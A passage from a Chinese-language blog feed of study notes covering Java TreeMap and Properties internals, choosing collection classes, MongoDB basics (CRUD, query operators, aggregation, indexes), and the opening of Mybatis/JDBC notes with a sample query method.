class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理：通过节点对象属性，按照排序规则判断元素的对象，指定子节点的位置</p><h3 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h3><p>节点类型： private transient Entry&lt;K,V&gt; root;</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Entry</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">        <span class="comment">// 属性</span></span><br><span class="line">    K key;</span><br><span class="line">        V value;</span><br><span class="line">        Entry&lt;K,V&gt; left;</span><br><span class="line">        Entry&lt;K,V&gt; right;</span><br><span class="line">        Entry&lt;K,V&gt; parent;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">color</span> <span class="operator">=</span> BLACK;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="title function_">TreeMap</span><span class="params">()</span> &#123;</span><br><span class="line">        comparator = <span class="literal">null</span>;   <span class="comment">// 如果使用空构造器，那么底层就不使用外部构造器</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TreeMap</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> K&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;   <span class="comment">// 如果使用有参构造器，就相当于指定了外部比较器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>put方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;   <span class="comment">// k,v的类型在创建对象时就指定了</span></span><br><span class="line">    <span class="comment">// 首次添加元素 ，t的值为null    </span></span><br><span class="line">    Entry&lt;K,V&gt; t = root; <span class="comment">// 第二次添加节点时，root已经是根节点了</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 自己跟自己比</span></span><br><span class="line">            compare(key, key); <span class="comment">// type (and possibly null) check</span></span><br><span class="line"><span class="comment">//跟节点确定为root</span></span><br><span class="line">            root = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(key, value, <span class="literal">null</span>);</span><br><span class="line">            size = <span class="number">1</span>;</span><br><span class="line">            modCount++;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> cmp;</span><br><span class="line">        Entry&lt;K,V&gt; parent;</span><br><span class="line">        <span class="comment">// split comparator and comparable paths</span></span><br><span class="line">    <span class="comment">// 将外部比较器 赋给 cpr</span></span><br><span class="line">        Comparator&lt;? <span class="built_in">super</span> K&gt; cpr = comparator;</span><br><span class="line">    <span class="comment">//  cpr 不等于 null, 意味着创建对象时调用了有参构造器，指定了外部比较器</span></span><br><span class="line">        <span class="keyword">if</span> (cpr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                parent = t;</span><br><span class="line">                cmp = cpr.compare(key, t.key);</span><br><span class="line">                <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)</span><br><span class="line">                    t = t.left;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)</span><br><span class="line">                    t = t.right;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> t.setValue(value);</span><br><span class="line">            &#125; <span class="keyword">while</span> (t != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//  cpr 等于 null, 意味着创建对象时调用了 空构造器，没有指定外部比较器，会使用内部比较器</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (key == <span class="literal">null</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                Comparable&lt;? <span class="built_in">super</span> K&gt; k = (Comparable&lt;? <span class="built_in">super</span> K&gt;) key;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                parent = t;</span><br><span class="line">                cmp = k.compareTo(t.key);  <span class="comment">//将元素的key值作比较</span></span><br><span class="line">                <span class="comment">// cpm 返回的值为int类型的值</span></span><br><span class="line">                <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)</span><br><span class="line">                    t = t.left;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (cmp &gt; <span class="number">0</span>)</span><br><span class="line">                    t = t.right;</span><br><span class="line">                <span class="keyword">else</span>  <span class="comment">// cmp == 0 </span></span><br><span class="line">                    <span class="comment">// 表示两个key 一样，key不变(key唯一），将原来的value替换为新的value</span></span><br><span class="line">                    <span class="keyword">return</span> t.setValue(value); </span><br><span class="line">            &#125; <span class="keyword">while</span> (t != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Entry&lt;K,V&gt; e = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(key, value, parent);</span><br><span class="line">        <span class="keyword">if</span> (cmp &lt; <span class="number">0</span>)</span><br><span class="line">            parent.left = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            parent.right = e;</span><br><span class="line">        fixAfterInsertion(e);</span><br><span class="line">        size++;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="Properties基本介绍"><a href="#Properties基本介绍" class="headerlink" title="Properties基本介绍"></a>Properties基本介绍</h3><ol><li>Properties类继承自HashTable类并且实现了Map接口，也是使用一种键值对的形式来保存数据。</li><li>他的使用特点和Hashtable类似</li><li>Properties 还可以 从 xxx.properties 文件中，加载数据到Properties类对象，并进行读取和修改</li><li>说明：xxx.properties 文件通常作为配置文件</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Properties_</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        1. Properties 继承自 Hashtable</span></span><br><span class="line"><span class="comment">//        2. 可以通过 k-v 存放数据， key和value不能为空</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        properties.put(<span class="string">&quot;john&quot;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="comment">//        properties.put(null,100);  //NullPointerException</span></span><br><span class="line"><span class="comment">//        properties.put(&quot;john&quot;,null); //NullPointerException</span></span><br><span class="line">        properties.put(<span class="string">&quot;lucy&quot;</span>,<span class="number">100</span>);</span><br><span class="line">        properties.put(<span class="string">&quot;lic&quot;</span>,<span class="number">100</span>);</span><br><span class="line">        properties.put(<span class="string">&quot;lic&quot;</span>,<span class="number">80</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(properties);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        通过 key 获取对应的值</span></span><br><span class="line">        System.out.println(properties.get(<span class="string">&quot;lic&quot;</span>));</span><br><span class="line"><span class="comment">//        删除</span></span><br><span class="line">        properties.remove(<span class="string">&quot;lic&quot;</span>);</span><br><span class="line">        System.out.println(properties);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        修改</span></span><br><span class="line">        properties.put(<span class="string">&quot;john&quot;</span>,<span class="string">&quot;wkliu&quot;</span>);</span><br><span class="line">        System.out.println(properties);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="开发中如何选择集合实现类"><a href="#开发中如何选择集合实现类" class="headerlink" title="开发中如何选择集合实现类"></a>开发中如何选择集合实现类</h3><p>在开发中，选择什么集合实现类，主要取决于业务操作特点，然后根据集合实现类特性进行选择，分析如下:</p><p>1)先判断存储的类型(一组对象[单列]或一组键值对[双列])<br>2)一组对象[单列]: Collection接口</p><ul><li>允许重复: List<ul><li>增删多: LinkedList [底层维护了一个双向链表]</li><li>改查多: ArrayList [底层维护Object类型的可变数组]</li></ul></li><li>不允许重复: Set<ul><li>无序: HashSet [底层是HashMap ,维护了一个哈希表即(数组+链表+红黑树)]</li><li>排序: TreeSet </li><li>插入和取出顺序一致: LinkedHashSet ,维护数组+双向链表</li></ul></li></ul><p>3)一组键值对[双列]: Map</p><ul><li>键无序: HashMap [底层是:哈希表jdk7: 数组+链表，jdk8: 数组+链表+红黑树]</li><li>键排序: TreeMap [老韩举例说明]</li><li>键插入和取出顺序一致: LinkedHashMap</li><li>读取文件Properties</li></ul><h3 id="Collection工具类"><a href="#Collection工具类" class="headerlink" title="Collection工具类"></a>Collection工具类</h3><ul><li>reverse(List):反转 List 中元素的顺序</li><li>shuffle(List):对 List 集合元素进行随机排序</li><li>sort(List):根据元素的自然顺序对指定 List 集合元素按升序排序</li><li>sort(List, Comparator): 根据指定的 Comparator 产生的顺序对List 集合元素排序</li><li>swap(List, int, int):将指定 List 集合中的i处元素和j处元素进行交换</li><li>Object max(Collection):根据元素的自然顺序，返回给定集合中的最大元素</li><li>Object max(Collection, Comparator): 根据Comparator指定的顺序，返回给定集合中的最大元素</li><li>Object min(Collection)</li><li>Object min(Collection, Comparator)</li><li>int frequency(Collection, Object): 返回指定集合中指定元素的出现次数</li><li>void copy(List dest,List src):将src中的内容复制到dest中</li><li>boolean replaceAll(List list, Object oldVal, Object newVal):使用新值替换 List 对象的所有旧值</li><li></li></ul>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法学习</category>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hashmap</tag>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MongoDB</title>
    <link href="/2023/06/18/MongoDB/"/>
    <url>/2023/06/18/MongoDB/</url>
    
    <content type="html"><![CDATA[<p>大三下Nosql课程，其中先介绍的是MongoDB，个人觉得比较重要，写下这篇文章记录MongoDB中的重要知识点。</p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>MongoDB的文档类似于JSON，JSON是一种简单的表示数据的方式，仅包含6种数据类型，分别是：null、布尔、数字、字符串、数组和对象。</p><p>虽然这些类型的表现已经足够强大，但是对于绝大多数应用来说还需要另外一些不可或缺的类型。例如，日期类型、数字类型（只有一种，没法区分整型和浮点）、正则表达式等。</p><p>MongoDB在保留JSON基本的键值对特性的基础上，添加了其他一些数据类型。</p><table><thead><tr><th>数据类型</th><th>描述</th></tr></thead><tbody><tr><td>String</td><td>字符串。存储数据常用的数据类型。在 MongoDB 中，UTF-8 编码的字符串才是合法的</td></tr><tr><td>Integer</td><td>整型数值。用于存储数值。根据你所采用的服务器，可分为 32 位或 64 位。</td></tr><tr><td>Boolean</td><td>布尔值。用于存储布尔值（真&#x2F;假）。</td></tr><tr><td>Double</td><td>双精度浮点值。用于存储浮点值。</td></tr><tr><td>Min&#x2F;Max keys</td><td>将一个值与 BSON（二进制的 JSON）元素的最低值和最高值相对比。</td></tr><tr><td>Array</td><td>用于将数组或列表或多个值存储为一个键。</td></tr><tr><td>Object</td><td>用于内嵌文档。</td></tr><tr><td>Null</td><td>用于创建空值。</td></tr><tr><td>Symbol</td><td>符号。该数据类型基本上等同于字符串类型，但不同的是，它一般用于采用特殊符号类型的语言。</td></tr><tr><td>Date</td><td>日期时间。用 UNIX 时间格式来存储当前日期或时间。你可以指定自己的日期时间：创建 Date 对象，传入年月日信息。</td></tr><tr><td>Object ID</td><td>对象 ID。用于创建文档的 ID。(如果不指定的话，mongodb默认会给一个 _id)</td></tr><tr><td>Binary Data</td><td>二进制数据。用于存储二进制数据。</td></tr><tr><td>Code</td><td>代码类型。用于在文档中存储 JavaScript 代码。</td></tr><tr><td>Regular expression</td><td>正则表达式</td></tr></tbody></table><h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>新建数据库<br>use DATABASE_NAME<br>如果数据库不存在，则创建数据库，否则切换到指定数据库。</li><li>查看数据库<br>show dbs<br>查看所有数据库<br>db<br>查看当前数据库</li><li>删除数据库<br>db.dropDatabase()<br>删除当前数据库，默认为 test，可以使用 db 命令查看当前数据库名。</li></ul><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p><strong>创建集合</strong><br>db.createCollection(name, options)<br>参数说明：<br>name: 要创建的集合名称<br>options: 可选参数, 指定有关内存大小及索引的选项</p><p>options 可以是如下参数：</p><table><thead><tr><th>字段</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td>capped</td><td>布尔</td><td>（可选）如果为 true，则创建固定集合。固定集合是指有着固定大小的集合，当达到最大值时，它会自动覆盖最早的文档。当该值为 true 时，必须指定 size 参数。</td></tr><tr><td>autoIndexId</td><td>布尔</td><td>3.2 之后不再支持该参数。（可选）如为 true，自动在 _id 字段创建索引。默认为 false。</td></tr><tr><td>size</td><td>数值</td><td>（可选）为固定集合指定一个最大值，即字节数。如果 capped 为 true，也需要指定该字段。</td></tr><tr><td>max</td><td>数值</td><td>（可选）指定固定集合中包含文档的最大数量。</td></tr></tbody></table><p><strong>删除集合</strong><br>db.COLLECTION_NAME.drop()<br>如果成功删除选定集合，则 drop() 方法返回true，否则返回 false。</p><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><ul><li><p>插入文档<br>db.COLLECTION_NAME.insert(document)或db.COLLECTION_NAME.save(document)<br>文档的数据结构和 JSON 基本一样。所有存储在集合中的数据都是 BSON 格式。<br>BSON 是一种类似 JSON 的二进制形式的存储格式，是 Binary JSON 的简称。<br>save()：如果 _id 主键存在则更新数据，如果不存在就插入数据。该方法新版本中已废弃，可以使用db.collection.insertOne() 或db.collection.replaceOne() 来代替。<br>insert(): 若插入的数据主键已经存在，则会抛<br>org.springframework.dao.DuplicateKeyException 异常，提示主键重复，不保存当前数据。<br>3.2 版本后还有以下几种语法可用于插入文档:<br>db.collection.insertOne():向指定集合中插入一条文档数据<br>db.collection.insertMany():向指定集合中插入多条文档数据</p></li><li><p>更新文档<br>1、update(criteria,objNew,upsert,multi) 方法<br>例：db.comment.update({‘title’:‘MongoDB 教程’},{$set:{‘title’:‘MongoDB’}})<br>参数说明：<br>criteria: update 的查询条件，类似 sql update 查询内 where 后面的条件，主要用于匹配文档。<br>objNew: 更新的对象和一些更新的操作符（如,inc…）等，也可以理解为 sql update 查询内 set 后面的条件<br>upsert : 可选，这个参数的意思是，如果不存在 update 的记录，是否插入objNew,true 为插入，默认是false，不插入。<br>multi : 可选，mongodb 默认是 false,只更新找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部更新。<br>2、save(document) 方法<br>通过传入的文档来替换已有文档，_id 主键存在就更新，不存在就插入。</p></li><li><p>删除文档<br>db.COLLECTION_NAME.remove(query,{justOne:&lt;boolean&gt;,writeConcern:&lt;document&gt;})<br>db.COLLECTION_NAME.remove({})删除所有文档<br>query：查询条件<br>justOne：可选，默认是 false,只删除找到的第一条记录，如果这个参数为true,就把按条件查出来多条记录全部删除。<br>writeConcern：可选，表示抛出异常的级别</p></li></ul><h2 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h2><p><strong>简单查询</strong><br>db.collection_name.find(query, projection)<br>query ：可选，使用查询操作符指定查询条件<br>projection ：可选，使用投影操作符指定返回键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）。<br>如果你需要以易读的方式来读取数据，可以使用 pretty() 方法，语法格式如下：db.col.find().pretty()<br>pretty()方法以格式化的方式来显示所有文档<br>操作符：<br>$and ——– 与<br>$or——– 或<br>$eq ——– equal<br>$gt ——– greater than &gt;<br>$gte ——— gt equal &gt;&#x3D;<br>$lt ——– less than &lt;<br>$lte ——— lt equal &lt;&#x3D;<br>$ne ———– not equal !&#x3D;<br>$in ——– 包含<br>$nin ——– 不包含<br>例：db.col.find({$or:[{“by”:”星星”},{“userid”: {$gte:”1005”}}]})</p><p><strong>模糊查询</strong><br>查询 title 包含”教”字的文档：<br>db.col.find({title:&#x2F;教&#x2F;})<br>查询 title 字段以”教”字开头的文档：<br>db.col.find({title:&#x2F;^教&#x2F;})<br>查询 title 字段以”教”字结尾的文档：<br>db.col.find({title:&#x2F;教$&#x2F;})</p><p><strong>聚合操作</strong><br>MongoDB的聚合操作通过是通过数据处理管理（pipeline）来实现的，一次操作可以使用多个管理来处理数据文档。使用管道是有顺序的，会依序将管道的结果传至下一个管道中继续处理，进而显示最后的结果 。<br>MongoDB的聚合管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的。<br>       聚合操作可用于实现分组、排序、数值 运算、条件筛选、多表关联查询等功能，且可以分片的环境下使用。</p><p>聚合框架中常用的管道操作：</p><ol><li>$project：修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。</li><li>$match：用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。</li><li>$limit：用来限制MongoDB聚合管道返回的文档数。</li><li>$skip：在聚合管道中跳过指定数量的文档，并返回余下的文档。</li><li>$unwind：将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。</li><li>$group：将集合中的文档分组，可用于统计结果。</li><li>$sort：将输入文档排序后输出。</li><li>$geoNear：输出接近某一地理位置的有序文档。</li></ol><p>$sort方法好像用的很少，实际查找排序中用.sort(key:1&#x2F;-1)这个方法比较多</p><p>表达式：处理输入文档并输出。表达式是无状态的，只能用于计算当前聚合管道的文档，不能处理其它的文档。</p><table><thead><tr><th>表达式</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>$sum</td><td>计算总和</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$sum : “$likes”}}}])</td></tr><tr><td>$avg</td><td>计算平均值</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$avg : “$likes”}}}])</td></tr><tr><td>$min</td><td>获取集合中所有文档对应值得最小值。</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$min : “$likes”}}}])</td></tr><tr><td>$max</td><td>获取集合中所有文档对应值得最大值。</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$max : “$likes”}}}])</td></tr><tr><td>$push</td><td>将值加入一个数组中，不会判断是否有重复的值。</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$push: “$url”}}}])</td></tr><tr><td>$addToSet</td><td>将值加入一个数组中，会判断是否有重复的值，若相同的值在数组中已经存在了，则不加入。</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$addToSet : “$url”}}}])</td></tr><tr><td>$first</td><td>根据资源文档的排序获取第一个文档数据。</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, first_url : {$first : “$url”}}}])</td></tr><tr><td>$last</td><td>根据资源文档的排序获取最后一个文档数据</td><td>db.mycol.aggregate([{$group : {_id : “$by_user”, last_url : {$last : “$url”}}}])</td></tr></tbody></table><h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>索引是一种特殊的数据结构，即采用B-Tree数据结构。索引是以易于遍历读取的形式存储着集合中文档的一小部分，文档的一小部分指文档中的特定字段或一&#x2F;多组字段，并且这些字段均按照字段的值进行排序。索引项的排序支持有效的等值匹配和基于范围的查询操作。此外，MongoDB还可以使用索引中的排序返回排序的结果。</p><p><strong>单字段索引</strong><br>MongoDB支持在文档的单个字段上创建用户定义的升序&#x2F;降序索引，因此被称为单字段索引（Single Field Index）。默认情况下，MongoDB中所有集合在“_id”字段上都有一个索引，用户也可以根据自己的需求添加额外索引来支持重要的查询和操作。由于MongoDB可以从任何方向遍历索引，因此对于单个字段索引和排序操作来说，索引项的排序顺序（即升序或降序）并不重要。</p><p><strong>复合索引</strong><br> MongoDB除了支持单字段索引外，还支持复合索引。所谓复合索引，就是包含多个字段的索引，一个复合索引最多可以包含31个字段。需要注意的是，若某字段属于哈希索引，则这时复合索引就不能包括该字段。</p><p><strong>多键索引</strong><br>若文档中的字段为数组类型，则每个字段都是数组中的一个元素，MongoDB将会为数组中的每个元素创建索引，因此被称为多键索引（Multikey Index）。多键索引允许通过匹配数组的一个或多个元素来查询包含该数组的文档。如果索引字段包含数组值，则MongoDB会自动确定是否创建多键索引，而无需显式地指定创建多键索引。</p><p><strong>文本索引</strong><br> MongoDB提供了一种文本索引类型，支持在集合中搜索字符串内容，即进行文本检索查询。文本索引不存储特定语言的停止词，例如“the”、“a”以及“or”等词，而是将集合中的词作为词干，只存储根词。为了执行文本检索查询，则集合上必须有一个text索引。一个集合只能拥有一个文本检索索引，但是这个索引可以覆盖多个字段。</p><p><strong>哈希索引</strong><br> 为了支持基于哈希分片键进行分片，MongoDB提供了哈希索引类型。哈希索引是使用哈希函数来计算索引字段的哈希值，若是该索引字段的哈希值在哈希索引的范围内，则分布的更加随机。需要注意的是，哈希索引只支持等值匹配，不支持基于范围的查询。</p><p><strong>操作语法</strong><br>查看索引：<br>db.COLLECTION_NAME.getIndexes()</p><p>查看索引大小<br>db.COLLECTION_NAME.totalIndexSize()</p><p>创建索引<br>db.COLLECTION_NAME.createIndex(keys,options)<br>keys：指定索引键及排序顺序，该参数值为文档类型，key用于指定索引键，value指定排序顺序，1为升序，-1为降序。<br>options：用于控制创建索引的选项，常见选项有unique和name，其中unique描述建立的索引是否唯一，默认为false。name描述所创建索引的名称，默认情况下MongoDB会通过连接索引的字段名和排序顺序生成一个索引名称。</p><p>删除索引<br>db.COLLECTION_NAME.dropIndex(index)<br>db.COLLECTION_NAME.dropIndexes()</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mybatis笔记</title>
    <link href="/2023/06/18/Mybatis%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/06/18/Mybatis%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="回顾JDBC"><a href="#回顾JDBC" class="headerlink" title="回顾JDBC"></a>回顾JDBC</h1><h2 id="JDBC介绍"><a href="#JDBC介绍" class="headerlink" title="JDBC介绍"></a>JDBC介绍</h2><p>1.JDBC是JAVAEE中的一种规范<br>2.指定Java类与关系型数据库服务器【MySql,Oracle,SqlServer】之间沟通规则<br>3.JDBC规范提供接口存在JDK JAR中。java.sql包<br>4.JDBC规范接口实现类由不同关系型数据库服务器厂商以JAR包形式提供</p><h2 id="executeUpdate与executeQuery"><a href="#executeUpdate与executeQuery" class="headerlink" title="executeUpdate与executeQuery:"></a>executeUpdate与executeQuery:</h2><ol><li>ps.executeUpdate：<ol><li>负责推送插入命令[insert]，更新命令[update]，删除命令[delete]</li><li>返回结果对表文件进行操作时，收到影响行数，比如插入了多少行，更新了多少行，删除了多少行</li></ol></li><li>ps.executeQuery：<ol><li>负责推送查询命令【select  *  from 表名】</li><li>返回结果是查询命令得到【临时表】，在JDBC规范中【临时表】交给ResultSet接口实现类管理。实际上返回ResultSet实例对象</li></ol></li></ol><h2 id="JDBC编程"><a href="#JDBC编程" class="headerlink" title="JDBC编程"></a>JDBC编程</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">findStudent</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//注册 mysql 驱动</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//连接数据的基本信息 url ，username，password</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/student&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="comment">//创建连接对象</span></span><br><span class="line">        conn = DriverManager.getConnection(url, username, password);</span><br><span class="line">        <span class="comment">//保存查询结果</span></span><br><span class="line">        List&lt;Student&gt; stuList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        <span class="comment">//创建 Statement, 用来执行 sql 语句</span></span><br><span class="line">        stmt = conn.createStatement();</span><br><span class="line">        <span class="comment">//执行查询，创建记录集，</span></span><br><span class="line">        rs = stmt.executeQuery(<span class="string">&quot;select * from student&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">            <span class="type">Student</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">            stu.setId(rs.getInt(<span class="string">&quot;id&quot;</span>));</span><br><span class="line">            stu.setName(rs.getString(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">            stu.setAge(rs.getInt(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">            <span class="comment">//从数据库取出数据转为 Student 对象，封装到 List 集合</span></span><br><span class="line">            stuList.add(stu);</span><br><span class="line">        